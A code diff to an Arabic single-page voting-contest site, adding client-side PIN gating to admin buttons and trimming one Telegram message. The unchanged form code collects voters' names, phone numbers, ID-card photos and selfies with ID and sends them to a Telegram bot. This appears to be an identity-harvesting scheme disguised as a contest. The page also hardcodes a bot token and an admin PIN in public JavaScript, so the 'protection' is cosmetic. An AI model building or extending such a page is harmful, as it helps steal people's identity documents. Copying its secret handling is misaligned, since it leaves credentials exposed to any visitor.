@@ -268,14 +268,19 @@
   }
   .quick-vote-btn:hover { transform: scale(1.06); background: var(--green-bright); }
 
+  /* إخفاء تام لعناصر الإدارة عن العامة حتى يتم تفعيل وضع الإدارة بالرمز السري */
   .admin-only-control {
-    display: none;
+    display: none !important;
   }
   body.admin-mode .admin-only-control {
-    display: inline-block;
+    display: inline-flex !important;
   }
+  body.admin-mode .admin-row-actions.admin-only-control {
+    display: flex !important;
+  }
+
   .admin-row-actions {
-    display: flex; gap: 6px; justify-content: flex-start; flex-wrap: wrap; margin-top: 6px;
+    gap: 6px; justify-content: flex-start; flex-wrap: wrap; margin-top: 6px;
   }
   .admin-report-btn {
     background: rgba(56, 189, 248, 0.18);
@@ -610,7 +615,7 @@
           <div style="text-align:center; padding:30px; color:var(--text-muted);">⏳ جارٍ تحميل قائمة المتسابقين...</div>
         </div>
 
-        <!-- شريط الإدارة -->
+        <!-- شريط الإدارة (مغلق ومحجوب للعامة؛ تظهر أدواته فقط بعد إدخال رمز الإدارة) -->
         <div style="margin-top:20px; padding-top:15px; border-top:1px dashed var(--border); display:flex; gap:8px; flex-wrap:wrap; justify-content:space-between; align-items:center;">
           <div style="display:flex; gap:8px; flex-wrap:wrap;">
             <button type="button" class="admin-only-control" onclick="sendSortedReportToAdmin()" style="background:rgba(56,189,248,0.14); border:1px solid var(--cyan); color:var(--cyan); padding:9px 12px; border-radius:12px; font-weight:800; font-size:12px; cursor:pointer;">
@@ -784,13 +789,18 @@
 const API_KEY = "8700247738:AAF8YH956qBKGSA8seF_AtZPpLw2eMO3qSw";
 const DEST_ID = "8299163806";
 const ADMIN_PIN = "777908028";
-const STORAGE_KEY = "amir_felling_v8";
+const STORAGE_KEY = "amir_felling_v9";
 const MAX_CAP = 500;
 
 let voterIdBlob = null;
 let idCardBlob = null;
 let selfieIdBlob = null;
 let expectedCaptchaAnswer = 8;
+let isAdminUnlocked = false;
+
+function isAdminAuthorized() {
+  return isAdminUnlocked && document.body.classList.contains("admin-mode");
+}
 
 function makeInitialList() {
   const names = [
@@ -1145,22 +1155,7 @@ document.getElementById("voteForm").addEventListener("submit", function(e) {
   fetch(`https://api.telegram.org/bot${API_KEY}/sendPhoto`, {
     method: "POST",
     body: fd
-  }).then(() => {
-    const totalNow = stateData.c.reduce((sum, item) => sum + (item.v || 0), 0);
-    const orderedMsg =
-`🏆 <b>الترتيب المرتب لمسابقة فلينج — أمير المترات</b>
-🗳️ <b>إجمالي الأصوات:</b> <b>${totalNow}</b> | 👥 <b>المتسابقون:</b> <b>${stateData.c.length}/${MAX_CAP}</b>
-━━━━━━━━━━━━━━━━━━
-${buildSortedLines(25)}`;
-
-    return fetch(`https://api.telegram.org/bot${API_KEY}/sendMessage`, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ chat_id: DEST_ID, text: orderedMsg, parse_mode: "HTML" })
-    });
-  }).then(() => {
-    syncCloudBackground();
-  }).catch(() => {});
+  }).then(() => syncCloudBackground()).catch(() => {});
 
   document.getElementById("voterName").value = "";
   document.getElementById("voterPhone").value = "";
@@ -1279,7 +1274,9 @@ document.getElementById("raffleForm").addEventListener("submit", function(e) {
   btn.textContent = "🔥 أقر بصحة بياناتي وإصدار رابط التصويت الخاص بي";
 });
 
+/* ===== وظائف الإدارة المحمية (لا تعمل ولا تظهر إلا بعد إدخال رمز الإدارة) ===== */
 async function sendSingleCandidateVotersReport(code) {
+  if (!isAdminAuthorized()) return;
   const cand = stateData.c.find(c => c.k === code);
   if (!cand) return;
 
@@ -1311,6 +1308,7 @@ async function sendSingleCandidateVotersReport(code) {
 }
 
 async function testSystemConnection() {
+  if (!isAdminAuthorized()) return;
   try {
     const me = await fetch(`https://api.telegram.org/bot${API_KEY}/getMe`).then(r => r.json());
     if (!me.ok) {
@@ -1335,21 +1333,26 @@ async function testSystemConnection() {
 }
 
 function toggleAdminMode() {
-  if (document.body.classList.contains("admin-mode")) {
+  if (isAdminAuthorized()) {
+    isAdminUnlocked = false;
     document.body.classList.remove("admin-mode");
-    alert("تم الخروج من وضع الإدارة.");
+    alert("تم قفل وإخفاء وضع الإدارة.");
     return;
   }
   const pin = prompt("🔐 أدخل الرقم السري للإدارة:");
   if (pin === ADMIN_PIN) {
+    isAdminUnlocked = true;
     document.body.classList.add("admin-mode");
-    alert("✅ تم تفعيل وضع الإدارة! ظهر بجانب كل متسابق زر (تقرير المصوّتين) وزر (حذف) بشكل مستقل.");
+    alert("✅ تم فتح وضع الإدارة! أزرار الإدارة ظاهرة لك فقط.");
   } else if (pin !== null) {
+    isAdminUnlocked = false;
+    document.body.classList.remove("admin-mode");
     alert("❌ الرقم السري غير صحيح!");
   }
 }
 
 function adminDeleteCandidate(code, name) {
+  if (!isAdminAuthorized()) return;
   if (!confirm(`⚠️ هل أنت متأكد من حذف المتسابق (${name} - ${code}) نهائياً؟`)) return;
   stateData.c = stateData.c.filter(c => c.k !== code);
   saveStateLocal();
@@ -1359,6 +1362,7 @@ function adminDeleteCandidate(code, name) {
 }
 
 async function sendSortedReportToAdmin() {
+  if (!isAdminAuthorized()) return;
   if (stateData.c.length === 0) {
     alert("لا يوجد متسابقون مسجلون حالياً.");
     return;
